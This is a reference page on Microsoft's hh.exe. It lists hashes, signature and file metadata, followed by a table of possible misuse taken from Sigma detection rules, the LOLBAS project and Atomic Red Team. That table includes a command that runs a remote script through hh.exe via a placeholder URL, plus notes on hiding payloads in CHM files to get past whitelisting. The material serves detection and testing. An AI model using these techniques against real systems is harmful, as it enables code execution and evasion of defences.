---
title: hh.exe | Microsoft HTML Help Executable
---

# hh.exe 

* File Path: `C:\WINDOWS\SysWOW64\hh.exe`
* Description: Microsoft HTML Help Executable
* Comments: 

## Hashes

Type | Hash
-- | --
MD5 | `1DDFACDAC1875864336F7B61A7E562C9`
SHA1 | `BDC2D9DC76B16AD7A3C2105096C37453E5B2D913`
SHA256 | `14D84E388E265AB531320ED11FB386249B0E4DE5D1075C525470304E1CD125A0`
SHA384 | `BF6E7EE9CAAEE9D93EB92D6B73BB32408C275D38322B34C8F49C7C7438F9F1D91A03C1B29F878685836F9E9E077A39C6`
SHA512 | `D1B98FEA80615C08E86BD6669D2CB32F072641B29779D0F425802031A96C2F764EE2F6590A8016AD0C75420B1DF59CC1DEE663A7B42DEAA092DEF1480BDE1AC4`
SSDEEP | `192:zKLI4aXNtrWeydEtcGxCRLoOVR4kBGJ1KDJD/oWcGE:uaTqeOJGxCRUSzA1KDWWcG`

## Runtime Data

### Usage (stdout):
```Batchfile

```

### Usage (stderr):
```Batchfile

```

### Child Processes:


## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: HH.exe.mui
* Product Name: HTML Help
* Company Name: Microsoft Corporation
* File Version: 10.0.18362.1 (WinBuild.160101.0800)
* Product Version: 10.0.18362.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.

## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\hh.exe](hh.exe-1CECEE8D02A8E9B19D3A1A65C7A2B249.md) | 33
[C:\Windows\hh.exe](hh.exe-2C8FE78D53C8CA27523A71DFD2938241.md) | 36
[C:\Windows\hh.exe](hh.exe-52AFE6DE5E463B7A08C184B1EB49DD6A.md) | 40
[C:\WINDOWS\hh.exe](hh.exe-DF73D52FDCE65F90A2E49EFB5248C77C.md) | 43
[C:\Windows\SysWOW64\hh.exe](hh.exe-25DA176935752443FE077C2F0F819B7E.md) | 61
[C:\Windows\SysWOW64\hh.exe](hh.exe-7AA22C33D8C35E6F59ADB2D02C8702C7.md) | 49
[C:\Windows\SysWOW64\hh.exe](hh.exe-A97778801ABF79482E757200E4035A01.md) | 63

## Possible Misuse

*The following table contains possible examples of `hh.exe` being misused. While `hh.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [godmode_sigma_rule.yml](https://github.com/Neo23x0/sigma/blob/master/other/godmode_sigma_rule.yml) | `            - '\hh.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_hh_chm.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_hh_chm.yml) | `title: HH.exe Execution` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_hh_chm.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_hh_chm.yml) | `description: Identifies usage of hh.exe executing recently modified .chm files.` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_hh_chm.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_hh_chm.yml) | `        Image\|endswith: '\hh.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_html_help_spawn.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_html_help_spawn.yml) | `        ParentImage: 'C:\Windows\hh.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_office_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml) | `            - '*\hh.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_remote_thread.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_remote_thread.yml) | `            - '\hh.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `Name: Hh.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `  - Command: HH.exe http://some.url/script.ps1` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `  - Command: HH.exe c:\windows\system32\calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `    Usecase: Execute process with HH.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `  - Path: C:\Windows\System32\hh.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `  - Path: C:\Windows\SysWOW64\hh.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | ` - IOC: hh.exe should normally not be in use on a normal workstation` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | <blockquote>Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)</blockquote> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | Uses hh.exe to execute a local compiled HTML Help payload. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | hh.exe #{local_chm_file} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | Uses hh.exe to execute a remote compiled HTML Help payload. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | hh.exe #{remote_chm_file} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020 Strontic.


